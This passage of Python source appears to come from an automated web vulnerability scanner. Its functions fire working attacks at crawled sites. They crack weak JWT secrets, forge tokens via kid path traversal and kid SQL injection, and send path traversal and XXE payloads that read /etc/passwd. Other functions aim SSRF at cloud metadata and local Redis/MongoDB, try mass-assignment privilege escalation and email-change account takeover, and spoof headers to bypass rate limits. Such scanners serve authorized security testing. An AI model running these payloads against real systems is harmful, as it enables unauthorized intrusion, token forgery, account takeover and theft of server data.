                            "detail": f"Log file ({len(r.content)}b) accessible",
                            "template": "apex-laravel",
                        })
            except: pass
    with apex_instance._vuln_lock:
        apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)


# ---------------------------------------------------------------------------
# ELITE BATCH 10: JWT brute-force, CORS subdomain wildcard,
#                 BOPLA, API key in URL, insecure file download,
#                 mass assignment via PATCH, postMessage wildcard,
#                 prototype pollution via path, GraphQL subscription
# ---------------------------------------------------------------------------

_WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin", "test", "key",
    "jwt", "token", "auth", "changeme", "default", "pass", "1234",
    "secret123", "password123", "mysecret", "jwtkey", "supersecret",
    "your-256-bit-secret", "your-secret-key", "HS256", "HS512",
    "access_token_secret", "refresh_token_secret", "app_secret",
    "", "null", "undefined", "none",
]

def scan_jwt_secret_bruteforce(crawl_data):
    """Brute-force weak JWT secrets — if cracked, forge admin tokens."""
    import base64 as _b64, hmac as _hmac, hashlib as _hl, json as _j
    findings = []
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Find JWTs in cookies, headers, body
            sources = list(r.cookies.values()) + [r.headers.get("Authorization",""),
                                                    r.headers.get("Set-Cookie",""), r.text[:3000]]
            for src in sources:
                for jwt in jwt_re.findall(str(src)):
                    parts = jwt.split(".")
                    if len(parts) != 3: continue
                    try:
                        pad = lambda s: s + "=" * (-len(s) % 4)
                        header = json.loads(_b64.urlsafe_b64decode(pad(parts[0])))
                        alg = header.get("alg", "").upper()
                        if alg not in ("HS256", "HS384", "HS512"): continue
                        hash_fn = {"HS256": _hl.sha256, "HS384": _hl.sha384,
                                   "HS512": _hl.sha512}.get(alg, _hl.sha256)
                        msg = f"{parts[0]}.{parts[1]}".encode()
                        sig = _b64.urlsafe_b64decode(pad(parts[2]))
                        for secret in _WEAK_JWT_SECRETS:
                            expected = _hmac.new(secret.encode(), msg, hash_fn).digest()
                            if _hmac.compare_digest(expected, sig):
                                payload = json.loads(_b64.urlsafe_b64decode(pad(parts[1])))
                                findings.append({
                                    "type": "JWT Weak Secret (Cracked)",
                                    "severity": "critical",
                                    "url": page["url"],
                                    "detail": f"JWT secret is '{secret}' — can forge tokens. Payload: {str(payload)[:100]}",
                                    "template": "apex-jwt-crack",
                                })
                                break
                    except: pass
        except: pass
    return findings


def scan_cors_subdomain_wildcard(crawl_data, subdomains):
    """CORS misconfiguration: wildcard subdomain allows attacker-controlled subdomains."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:10]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        host = urllib.parse.urlparse(base).netloc
        domain_parts = host.split(".")
        if len(domain_parts) < 2: continue
        tld = ".".join(domain_parts[-2:])
        # Test attacker-controlled subdomain
        attacker_origin = f"https://evil.{tld}"
        try:
            r = _S.get(page["url"], timeout=5, headers={"Origin": attacker_origin})
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == attacker_origin or (acao.endswith(tld) and "*" not in acao):
                sev = "critical" if acac.lower() == "true" else "high"
                findings.append({
                    "type": "CORS Subdomain Wildcard",
                    "severity": sev,
                    "url": page["url"],
                    "detail": f"Reflects subdomain origin {attacker_origin} — attacker can register evil.{tld}",
                    "template": "apex-cors-subdomain",
                })
        except: pass
        # Test null origin (sandboxed iframe)
        try:
            r = _S.get(page["url"], timeout=5, headers={"Origin": "null"})
            if r.headers.get("Access-Control-Allow-Origin") == "null":
                findings.append({
                    "type": "CORS Null Origin",
                    "severity": "high",
                    "url": page["url"],
                    "detail": "null origin accepted — sandboxed iframe attack possible",
                    "template": "apex-cors-null",
                })
        except: pass
    return findings


def scan_bopla(crawl_data):
    """Broken Object Property Level Authorization — set fields you shouldn't via PATCH/PUT."""
    findings = []
    priv_fields = {
        "role": "admin", "isAdmin": True, "admin": True, "verified": True,
        "active": True, "status": "active", "plan": "premium", "tier": "enterprise",
        "creditLimit": 999999, "balance": 999999, "permissions": ["admin"],
        "emailVerified": True, "phoneVerified": True, "kycVerified": True,
    }
    for page in crawl_data.get("pages", []):
        url = page["url"]
        # Look for user/profile/account endpoints
        if not any(x in url.lower() for x in ["user", "profile", "account", "me", "settings"]):
            continue
        base = "/".join(url.split("/", 3)[:3])
        for path in ["/api/me", "/api/user", "/api/profile", "/api/v1/me",
                     "/api/v1/user", "/api/account", "/user/profile"]:
            endpoint = f"{base}{path}"
            try:
                # Get baseline
                r_get = _S.get(endpoint, timeout=5)
                if r_get.status_code != 200: continue
                baseline = r_get.text
                # Try PATCH with privileged fields
                for field, value in list(priv_fields.items())[:5]:
                    r_patch = _S.request("PATCH", endpoint,
                                        json={field: value}, timeout=5,
                                        headers={"Content-Type": "application/json"})
                    if r_patch.status_code in (200, 204):
                        # Verify if field was actually set
                        r_verify = _S.get(endpoint, timeout=5)
                        if str(value).lower() in r_verify.text.lower() and str(value).lower() not in baseline.lower():
                            findings.append({
                                "type": f"BOPLA: Can Set '{field}' via PATCH",
                                "severity": "critical",
                                "url": endpoint,
                                "detail": f"PATCH {field}={value} accepted and persisted — privilege escalation",
                                "template": "apex-bopla",
                            })
                            break
            except: continue
    return findings


def scan_api_key_in_url(crawl_data):
    """Detect API keys passed as URL parameters — logged in server logs and Referer headers."""
    findings = []
    key_params = ("api_key", "apikey", "api-key", "key", "token", "access_token",
                  "auth_token", "secret", "client_secret", "app_key", "appkey",
                  "authorization", "bearer", "jwt", "session_token")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() in key_params:
                # Check if the value looks like a real key (not a placeholder)
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                val = qs.get(p, [""])[0]
                if len(val) >= 16 and val not in ("YOUR_API_KEY", "API_KEY", "TOKEN", ""):
                    findings.append({
                        "type": f"API Key/Token in URL Parameter: {p}",
                        "severity": "high",
                        "url": url,
                        "detail": f"Param '{p}' contains credential in URL — logged in server logs and Referer headers",
                        "template": "apex-key-url",
                    })
    # Also check page URLs for tokens
    for page in crawl_data.get("pages", []):
        url = page["url"]
        for param in key_params:
            if f"{param}=" in url.lower():
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                for k, vals in qs.items():
                    if k.lower() == param and vals and len(vals[0]) >= 16:
                        findings.append({
                            "type": f"Credential in URL: {k}",
                            "severity": "high",
                            "url": url,
                            "detail": f"Token/key in URL parameter '{k}' — exposed in logs",
                            "template": "apex-key-url",
                        })
    return findings


def scan_insecure_file_download(crawl_data):
    """Path traversal via file download parameters."""
    findings = []
    file_params = ("file", "filename", "path", "filepath", "download", "attachment",
                   "doc", "document", "name", "resource", "asset", "f", "src")
    traversal_payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
    ]
    markers = ["root:x:", "root:*:", "[fonts]", "daemon:", "[extensions]"]

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in file_params: continue
            for payload in traversal_payloads[:3]:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m in r.text for m in markers):
                        findings.append({
                            "type": "Path Traversal via File Download",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"File param '{p}' allows path traversal — reads /etc/passwd",
                            "template": "apex-file-traversal",
                        })
                        break
                except: continue

    # Also test download endpoints
    for page in crawl_data.get("pages", []):
        url = page["url"]
        if not any(x in url.lower() for x in ["download", "export", "file", "attachment"]):
            continue
        for payload in traversal_payloads[:2]:
            for p in ("file", "path", "name", "filename"):
                try:
                    test_url = f"{url}?{p}={urllib.parse.quote(payload)}"
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(m in r.text for m in markers):
                        findings.append({
                            "type": "Path Traversal in Download Endpoint",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"Download endpoint vulnerable to path traversal",
                            "template": "apex-file-traversal",
                        })
                        break
                except: continue
    return findings


def scan_prototype_pollution_path(crawl_data):
    """Prototype pollution via URL path segments — /api/__proto__/polluted."""
    findings = []
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        for path in ["/__proto__/polluted", "/constructor/prototype/polluted",
                     "/api/__proto__/test", "/api/constructor/prototype/test"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200:
                    body = r.text.lower()
                    if "polluted" in body or "prototype" in body:
                        findings.append({
                            "type": "Prototype Pollution via URL Path",
                            "severity": "high",
                            "url": f"{base}{path}",
                            "detail": "Server processes __proto__ in URL path — prototype pollution possible",
                            "template": "apex-pp-path",
                        })
            except: pass
    return findings


def scan_mass_assignment_patch(crawl_data):
    """Mass assignment via HTTP PATCH — often skips validation that POST has."""
    findings = []
    priv_fields = ["role", "admin", "isAdmin", "verified", "active", "plan",
                   "creditLimit", "balance", "permissions", "emailVerified"]
    for form in crawl_data.get("forms", []):
        action = form.get("action", "")
        if not action: continue
        method = form.get("method", "").upper()
        if method not in ("POST", "PUT"): continue
        inputs = form.get("inputs", [])
        try:
            baseline_data = {i.get("name","f"): i.get("value","test") for i in inputs}
            baseline = _S.post(action, json=baseline_data, timeout=5)
            # Try PATCH with extra privileged fields
            for field in priv_fields[:3]:
                patch_data = dict(baseline_data)
                patch_data[field] = "admin" if isinstance(field, str) else True
                r = _S.request("PATCH", action, json=patch_data, timeout=5,
                               headers={"Content-Type": "application/json"})
                if r.status_code in (200, 201, 204):
                    if r.text != baseline.text:
                        findings.append({
                            "type": f"Mass Assignment via PATCH: {field}",
                            "severity": "high",
                            "url": action,
                            "detail": f"PATCH accepts privileged field '{field}' — POST may not",
                            "template": "apex-mass-patch",
                        })
                        break
        except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 11: Account takeover vectors, OAuth deep testing,
#                 Subdomain takeover via CNAME services,
#                 HTTP request splitting, XXE via file upload,
#                 SSRF via URL redirect chains, GraphQL batching DoS
# ---------------------------------------------------------------------------

_TAKEOVER_FINGERPRINTS = {
    "github.io": ("There isn't a GitHub Pages site here", "GitHub Pages"),
    "s3.amazonaws.com": ("NoSuchBucket", "AWS S3"),
    "herokuapp.com": ("No such app", "Heroku"),
    "cloudfront.net": ("The request could not be satisfied", "CloudFront"),
    "bitbucket.io": ("Repository not found", "Bitbucket"),
    "shopify.com": ("Sorry, this shop is currently unavailable", "Shopify"),
    "surge.sh": ("project not found", "Surge.sh"),
    "fastly.net": ("Fastly error: unknown domain", "Fastly"),
    "ghost.io": ("The thing you were looking for is no longer here", "Ghost"),
    "pantheon.io": ("The gods are wise", "Pantheon"),
    "readme.io": ("Project doesnt exist", "Readme.io"),
    "statuspage.io": ("You are being redirected", "Statuspage"),
    "uservoice.com": ("This UserVoice subdomain is currently available", "UserVoice"),
    "zendesk.com": ("Help Center Closed", "Zendesk"),
    "wixsite.com": ("Error ConnectYourDomain", "Wix"),
    "wordpress.com": ("Do you want to register", "WordPress.com"),
    "tumblr.com": ("Whatever you were looking for doesn't currently exist", "Tumblr"),
    "azurewebsites.net": ("404 Web Site not found", "Azure"),
    "cloudapp.net": ("404 Web Site not found", "Azure"),
    "trafficmanager.net": ("404 Web Site not found", "Azure Traffic Manager"),
    "elasticbeanstalk.com": ("NoSuchBucket", "AWS Elastic Beanstalk"),
    "myshopify.com": ("Sorry, this shop is currently unavailable", "Shopify"),
    "netlify.app": ("Not Found", "Netlify"),
    "vercel.app": ("The deployment could not be found", "Vercel"),
    "fly.dev": ("404 Not Found", "Fly.io"),
    "render.com": ("Service not found", "Render"),
}

def scan_subdomain_takeover_deep(subdomains):
    """Deep subdomain takeover — checks 26 services, DNS CNAME validation."""
    if not subdomains:
        return []
    findings = []
    for sub in subdomains[:100]:
        for proto in ["https", "http"]:
            try:
                r = requests.get(f"{proto}://{sub}", timeout=6, verify=False,
                                allow_redirects=True)
                body = r.text
                for domain_hint, (sig, service) in _TAKEOVER_FINGERPRINTS.items():
                    if sig.lower() in body.lower():
                        findings.append({
                            "type": f"Subdomain Takeover: {service}",
                            "severity": "critical",
                            "url": f"{proto}://{sub}",
                            "detail": f"Dangling CNAME pointing to unclaimed {service} resource",
                            "template": "apex-takeover-deep",
                        })
                        break
                break
            except requests.exceptions.ConnectionError:
                # NXDOMAIN — check for dangling CNAME
                try:
                    result = subprocess.run(
                        ["dig", "+short", "CNAME", sub],
                        capture_output=True, text=True, timeout=5
                    )
                    cname = result.stdout.strip().rstrip(".")
                    if cname:
                        for domain_hint in _TAKEOVER_FINGERPRINTS:
                            if domain_hint in cname:
                                _, service = _TAKEOVER_FINGERPRINTS[domain_hint]
                                findings.append({
                                    "type": f"Subdomain Takeover (NXDOMAIN): {service}",
                                    "severity": "critical",
                                    "url": sub,
                                    "detail": f"CNAME {cname} → {service} but host unreachable",
                                    "template": "apex-takeover-deep",
                                })
                                break
                except Exception:
                    pass
                break
            except Exception:
                break
    return findings


def scan_account_takeover_vectors(crawl_data):
    """Test multiple ATO vectors: password reset flaws, email change, session fixation."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", []):
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)

        # 1. Password reset token predictability
        for path in ["/forgot-password", "/api/forgot-password", "/password/reset",
                     "/auth/forgot", "/api/auth/forgot-password"]:
            try:
                r1 = _S.post(f"{base}{path}", json={"email": "test1@test.com"}, timeout=5)
                r2 = _S.post(f"{base}{path}", json={"email": "test2@test.com"}, timeout=5)
                if r1.status_code in (200, 202) and r2.status_code in (200, 202):
                    # Check if tokens are in response (bad practice)
                    import re as _re
                    tokens1 = _re.findall(r'["\']?token["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', r1.text)
                    tokens2 = _re.findall(r'["\']?token["\']?\s*[:=]\s*["\']([^"\']{8,})["\']', r2.text)
                    if tokens1 and tokens2:
                        # Check if tokens are sequential/predictable
                        if tokens1[0][:4] == tokens2[0][:4]:
                            findings.append({
                                "type": "Predictable Password Reset Token",
                                "severity": "critical",
                                "url": f"{base}{path}",
                                "detail": f"Reset tokens share prefix: {tokens1[0][:8]}... — may be predictable",
                                "template": "apex-ato",
                            })
                        else:
                            findings.append({
                                "type": "Password Reset Token in Response",
                                "severity": "high",
                                "url": f"{base}{path}",
                                "detail": "Reset token returned in API response — should only be sent via email",
                                "template": "apex-ato",
                            })
            except: continue

        # 2. Email change without password confirmation
        for path in ["/api/user/email", "/api/me/email", "/api/account/email",
                     "/api/v1/user/email", "/api/profile/email"]:
            try:
                r = _S.put(f"{base}{path}",
                           json={"email": "attacker@evil.com"},
                           timeout=5)
                if r.status_code in (200, 204):
                    findings.append({
                        "type": "Email Change Without Password Confirmation",
                        "severity": "high",
                        "url": f"{base}{path}",
                        "detail": "Email can be changed without current password — account takeover via email change",
                        "template": "apex-ato",
                    })
            except: continue

        # 3. Session fixation — server accepts pre-set session ID
        try:
            fixed_session = "apex_fixed_session_12345"
            r = _S.get(base, timeout=5,
                       headers={"Cookie": f"session={fixed_session}; sessionid={fixed_session}"})
            # Check if our fixed session ID is reflected/accepted
            set_cookie = r.headers.get("Set-Cookie", "")
            if fixed_session in set_cookie or fixed_session in r.text:
                findings.append({
                    "type": "Session Fixation",
                    "severity": "high",
                    "url": base,
                    "detail": "Server accepts and reflects pre-set session ID — session fixation possible",
                    "template": "apex-session-fix",
                })
        except: pass

    return findings


def scan_oauth_deep(crawl_data):
    """Deep OAuth testing: PKCE bypass, state fixation, token leakage via referrer."""
    findings = []
    tested = set()

    for page in crawl_data.get("pages", []):
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)

        oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                       "/connect/authorize", "/login/oauth", "/.well-known/openid-configuration"]

        for path in oauth_paths:
            url = f"{base}{path}"
            try:
                r = _S.get(url, timeout=5, allow_redirects=False)
                if r.status_code not in (200, 302, 400, 401): continue

                # 1. Missing PKCE (code_challenge)
                auth_url = f"{url}?client_id=test&response_type=code&redirect_uri=https://example.com"
                r2 = _S.get(auth_url, timeout=5, allow_redirects=False)
                if r2.status_code in (200, 302):
                    loc = r2.headers.get("Location", "")
                    if "code=" in loc and "code_challenge" not in auth_url:
                        findings.append({
                            "type": "OAuth Missing PKCE",
                            "severity": "high",
                            "url": auth_url,
                            "detail": "Authorization code issued without PKCE — code interception attack possible",
                            "template": "apex-oauth-pkce",
                        })

                # 2. State parameter not required
                no_state_url = f"{url}?client_id=test&response_type=code&redirect_uri=https://example.com"
                r3 = _S.get(no_state_url, timeout=5, allow_redirects=False)
                if r3.status_code in (200, 302):
                    loc3 = r3.headers.get("Location", "")
                    if "code=" in loc3 and "state=" not in loc3:
                        findings.append({
                            "type": "OAuth Missing State Parameter (CSRF)",
                            "severity": "high",
                            "url": no_state_url,
                            "detail": "OAuth flow proceeds without state parameter — CSRF attack possible",
                            "template": "apex-oauth-state",
                        })

                # 3. Token in fragment leaks via Referer
                if "access_token=" in page["url"] or "id_token=" in page["url"]:
                    findings.append({
                        "type": "OAuth Token in URL Fragment",
                        "severity": "high",
                        "url": page["url"],
                        "detail": "OAuth token in URL — leaks via Referer header to third-party resources",
                        "template": "apex-oauth-fragment",
                    })

            except: continue

    return findings


def scan_xxe_file_upload(crawl_data):
    """XXE via file upload — SVG, DOCX, XLSX, XML files."""
    findings = []
    xxe_svg = b"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

    xxe_xml = b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

    for form in crawl_data.get("forms", []):
        file_inputs = [i for i in form.get("inputs", []) if i.get("type") == "file"]
        if not file_inputs: continue
        action = form.get("action", "")
        if not action: continue

        for fname, content, ctype in [
            ("test.svg", xxe_svg, "image/svg+xml"),
            ("test.xml", xxe_xml, "application/xml"),
            ("test.docx", xxe_xml, "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ]:
            try:
                files = {file_inputs[0].get("name", "file"): (fname, content, ctype)}
                r = _S.post(action, files=files, timeout=8)
                if "root:" in r.text or "daemon:" in r.text:
                    findings.append({
                        "type": f"XXE via File Upload ({fname})",
                        "severity": "critical",
                        "url": action,
                        "detail": f"XXE in {fname} upload reads /etc/passwd",
                        "template": "apex-xxe-upload",
                    })
                    break
                elif r.status_code in (200, 201) and "xxe" not in r.text.lower():
                    # File accepted — may be processed server-side
                    findings.append({
                        "type": f"Potential XXE via File Upload ({fname})",
                        "severity": "medium",
                        "url": action,
                        "detail": f"{fname} accepted — server may process XML entities",
                        "template": "apex-xxe-upload",
                    })
            except: continue
    return findings


def scan_ssrf_redirect_chain(crawl_data):
    """SSRF via open redirect chains — use open redirect to bypass SSRF allowlists."""
    findings = []
    # Find open redirects first
    open_redirects = []
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in ("url", "redirect", "next", "goto", "dest", "return"):
                continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = ["https://169.254.169.254/latest/meta-data/"]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=5, allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "169.254.169.254" in loc:
                    findings.append({
                        "type": "SSRF via Open Redirect Chain",
                        "severity": "critical",
                        "url": test_url,
                        "detail": f"Open redirect to cloud metadata — SSRF via redirect chain",
                        "template": "apex-ssrf-redirect",
                    })
                    open_redirects.append(url)
            except: continue

    # Test SSRF endpoints with redirect chain
    ssrf_params = ("url", "src", "source", "fetch", "proxy", "request", "uri")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in ssrf_params: continue
            if not open_redirects: continue
            # Use open redirect as SSRF bypass
            redirect_url = open_redirects[0].split("?")[0] + f"?url=http://169.254.169.254/"
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [redirect_url]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=8)
                if any(x in r.text for x in ["ami-id", "instance-id", "iam"]):
                    findings.append({
                        "type": "SSRF via Redirect Chain Bypass",
                        "severity": "critical",
                        "url": test_url,
                        "detail": "SSRF allowlist bypassed via open redirect chain",
                        "template": "apex-ssrf-redirect",
                    })
            except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 12: JWT kid injection, rate limit bypass via headers,
#                 IDOR in JSON body, auth bypass via content-type,
#                 SSRF via SVG, NoSQL operator injection,
#                 unkeyed cache poisoning, GraphQL alias introspection bypass,
#                 CORS with Vary:Origin, API rate limit header rotation
# ---------------------------------------------------------------------------

def scan_jwt_kid_injection(crawl_data):
    """JWT kid (Key ID) parameter injection — path traversal and SQL injection in kid."""
    import base64 as _b64, json as _j, hmac as _hm, hashlib as _hl
    findings = []
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            sources = list(r.cookies.values()) + [r.headers.get("Authorization", ""), r.text[:2000]]
            for src in sources:
                for jwt in jwt_re.findall(str(src)):
                    parts = jwt.split(".")
                    if len(parts) != 3: continue
                    try:
                        pad = lambda s: s + "=" * (-len(s) % 4)
                        header = json.loads(_b64.urlsafe_b64decode(pad(parts[0])))
                        payload = json.loads(_b64.urlsafe_b64decode(pad(parts[1])))
                        if "kid" not in header: continue

                        base_url = "/".join(page["url"].split("/", 3)[:3])

                        # Test 1: kid path traversal — point to /dev/null (empty key)
                        new_header = dict(header)
                        new_header["kid"] = "../../dev/null"
                        new_header_b64 = _b64.urlsafe_b64encode(
                            json.dumps(new_header, separators=(",",":")).encode()
                        ).rstrip(b"=").decode()
                        # Sign with empty key
                        msg = f"{new_header_b64}.{parts[1]}".encode()
                        sig = _hm.new(b"", msg, _hl.sha256).digest()
                        sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                        forged = f"{new_header_b64}.{parts[1]}.{sig_b64}"

                        r2 = _S.get(page["url"], timeout=5,
                                   headers={"Authorization": f"Bearer {forged}"})
                        if r2.status_code == 200 and r2.status_code != r.status_code:
                            findings.append({
                                "type": "JWT kid Path Traversal (Empty Key)",
                                "severity": "critical",
                                "url": page["url"],
                                "detail": "kid=../../dev/null accepted — JWT signed with empty key",
                                "template": "apex-jwt-kid",
                            })

                        # Test 2: kid SQL injection
                        new_header["kid"] = "' UNION SELECT 'secret'--"
                        new_header_b64 = _b64.urlsafe_b64encode(
                            json.dumps(new_header, separators=(",",":")).encode()
                        ).rstrip(b"=").decode()
                        msg = f"{new_header_b64}.{parts[1]}".encode()
                        sig = _hm.new(b"secret", msg, _hl.sha256).digest()
                        sig_b64 = _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                        forged_sql = f"{new_header_b64}.{parts[1]}.{sig_b64}"
                        r3 = _S.get(page["url"], timeout=5,
                                   headers={"Authorization": f"Bearer {forged_sql}"})
                        if r3.status_code == 200:
                            findings.append({
                                "type": "JWT kid SQL Injection",
                                "severity": "critical",
                                "url": page["url"],
                                "detail": "kid parameter accepts SQL — JWT key fetched from DB via SQLi",
                                "template": "apex-jwt-kid",
                            })
                    except: pass
        except: pass
    return findings


def scan_rate_limit_bypass_headers(crawl_data):
    """Bypass rate limiting via IP spoofing headers — rotate X-Forwarded-For."""
    findings = []
    tested = set()
    spoof_headers = [
        "X-Forwarded-For", "X-Real-IP", "X-Client-IP",
        "True-Client-IP", "CF-Connecting-IP", "X-Originating-IP",
    ]
    for page in crawl_data.get("pages", []):
        if not any(x in page["url"].lower() for x in ["login", "auth", "api", "forgot", "reset"]):
            continue
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)

        for path in ["/login", "/api/login", "/auth", "/api/auth", "/forgot-password"]:
            url = f"{base}{path}"
            try:
                # First: hit rate limit
                blocked = False
                for i in range(20):
                    r = _S.post(url, json={"email": "test@test.com", "password": "wrong"},
                               timeout=3)
                    if r.status_code == 429 or "rate" in r.text.lower():
                        blocked = True
                        break

                if not blocked: continue

                # Now try bypass with rotating IPs
                for header in spoof_headers:
                    import random
                    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                    r_bypass = _S.post(url,
                                      json={"email": "test@test.com", "password": "wrong"},
                                      timeout=5, headers={header: fake_ip})
                    if r_bypass.status_code != 429 and "rate" not in r_bypass.text.lower():
                        findings.append({
                            "type": f"Rate Limit Bypass via {header}",
                            "severity": "high",
                            "url": url,
                            "detail": f"{header}: {fake_ip} bypasses rate limiting — brute force possible",
                            "template": "apex-ratelimit-bypass",
                        })
                        break
            except: continue
    return findings


def scan_idor_json_body(crawl_data):
    """IDOR in POST/PUT JSON body — user_id, account_id in request body."""
    findings = []
    id_fields = ("user_id", "userId", "account_id", "accountId", "id", "owner_id",
                 "ownerId", "customer_id", "customerId", "profile_id", "profileId")
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() not in ("POST", "PUT", "PATCH"): continue
        action = form.get("action", "")
        if not action: continue
        inputs = form.get("inputs", [])
        for inp in inputs:
            name = inp.get("name", "")
            if name.lower() not in id_fields: continue
            orig_val = inp.get("value", "1")
            try:
                # Get baseline with original ID
                data = {i.get("name","f"): i.get("value","test") for i in inputs}
                r_orig = _S.post(action, json=data, timeout=5)
                # Try different IDs
                for test_id in ["1", "2", "3", str(int(orig_val or "1") + 1)]:
                    if test_id == str(orig_val): continue
                    data[name] = test_id
                    r_test = _S.post(action, json=data, timeout=5)
                    if (r_test.status_code == 200 and
                            r_test.text != r_orig.text and
                            len(r_test.content) > 50):
                        findings.append({
                            "type": f"IDOR in JSON Body: {name}",
                            "severity": "high",
                            "url": action,
                            "detail": f"Changing {name} from {orig_val} to {test_id} returns different data",
                            "template": "apex-idor-json",
                        })
                        break
            except: continue
    return findings


def scan_auth_bypass_content_type(crawl_data):
    """Auth bypass via Content-Type manipulation — JSON vs form-encoded validation differences."""
    findings = []
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        action = form.get("action", "").lower()
        if not any(x in action for x in ["login", "auth", "signin", "admin"]): continue
        inputs = form.get("inputs", [])
        data = {i.get("name","f"): i.get("value","test") for i in inputs}

        try:
            # Baseline: form-encoded
            r_form = _S.post(form["action"], data=data, timeout=5)
            # Test 1: JSON content-type
            r_json = _S.post(form["action"], json=data, timeout=5,
                            headers={"Content-Type": "application/json"})
            # Test 2: XML content-type
            xml_body = "<root>" + "".join(f"<{k}>{v}</{k}>" for k,v in data.items()) + "</root>"
            r_xml = _S.post(form["action"], data=xml_body, timeout=5,
                           headers={"Content-Type": "application/xml"})
            # Test 3: Multipart
            r_multi = _S.post(form["action"], files={k: (None, v) for k,v in data.items()}, timeout=5)

            for r_test, ctype in [(r_json, "JSON"), (r_xml, "XML"), (r_multi, "Multipart")]:
                if (r_test.status_code == 200 and r_form.status_code != 200):
                    findings.append({
                        "type": f"Auth Bypass via Content-Type ({ctype})",
                        "severity": "critical",
                        "url": form["action"],
                        "detail": f"{ctype} content-type bypasses auth check that blocks form-encoded",
                        "template": "apex-ct-bypass",
                    })
                elif (r_test.status_code != r_form.status_code and
                      r_test.status_code in (200, 302)):
                    findings.append({
                        "type": f"Different Response for Content-Type ({ctype})",
                        "severity": "medium",
                        "url": form["action"],
                        "detail": f"{ctype} returns {r_test.status_code} vs form-encoded {r_form.status_code}",
                        "template": "apex-ct-bypass",
                    })
        except: continue
    return findings


def scan_ssrf_via_svg(crawl_data):
    """SSRF via SVG upload — SVG with external entity or href."""
    findings = []
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost:6379",  # Redis
        "http://localhost:27017",  # MongoDB
    ]
    for target in ssrf_targets[:2]:
        svg_ssrf = f"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image href="{target}" height="100" width="100"/>
</svg>""".encode()

        for form in crawl_data.get("forms", []):
            file_inputs = [i for i in form.get("inputs", []) if i.get("type") == "file"]
            if not file_inputs: continue
            action = form.get("action", "")
            if not action: continue
            try:
                files = {file_inputs[0].get("name", "file"): ("test.svg", svg_ssrf, "image/svg+xml")}
                r = _S.post(action, files=files, timeout=8)
                if any(x in r.text for x in ["ami-id", "instance-id", "ssh-", "root:", "redis"]):
                    findings.append({
                        "type": "SSRF via SVG Upload",
                        "severity": "critical",
                        "url": action,
                        "detail": f"SVG with external href reaches {target}",
                        "template": "apex-ssrf-svg",
                    })
                    break
